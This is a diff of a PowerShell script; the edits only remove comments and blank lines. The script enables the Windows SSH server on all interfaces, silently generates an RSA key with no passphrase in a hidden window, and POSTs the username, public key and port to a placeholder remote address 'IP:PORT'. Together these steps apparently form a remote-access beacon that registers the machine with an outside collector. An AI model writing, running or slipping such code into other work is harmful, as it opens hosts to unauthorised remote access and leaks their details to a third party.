@@ -20,7 +20,6 @@ Set-Service -Name sshd -StartupType 'Automatic'
 $sshdConfigPath = "C:\ProgramData\ssh\sshd_config"
 if (-not (Test-Path $sshdConfigPath)) {
     @"
-# Default SSH Configuration
 Port 22
 AddressFamily any
 ListenAddress 0.0.0.0
@@ -44,29 +43,23 @@ $sshDir = "$HOME\.ssh"
 if (-not (Test-Path -Path $sshDir)) {
     New-Item -ItemType Directory -Force -Path $sshDir
 }
-
 $sshKey = "$sshDir\id_rsa"
 $sshKeyPub = "$sshKey.pub"
-
 if (-not (Test-Path -Path $sshKey)) {
     Start-Process "ssh-keygen" -ArgumentList "-t rsa -b 2048 -f $sshKey -q -N ''" -WindowStyle Hidden -Wait
 }
-
 if (Test-Path -Path $sshKeyPub) {
     $publicKey = Get-Content -Path $sshKeyPub -Raw
 } else {
     $publicKey = "[Error: Public key not generated]"
 }
-
 $username = $env:USERNAME
 $port = 22
-
-# Enviar los datos vía POST
+# paypy post
 $postUri = "http://IP:PORT/host"
 $postData = @{
     "Username" = $username
     "PublicKey" = $publicKey
     "Port" = $port
 } | ConvertTo-Json
-
 Invoke-RestMethod -Uri $postUri -Method Post -Body $postData -ContentType 'application/json'
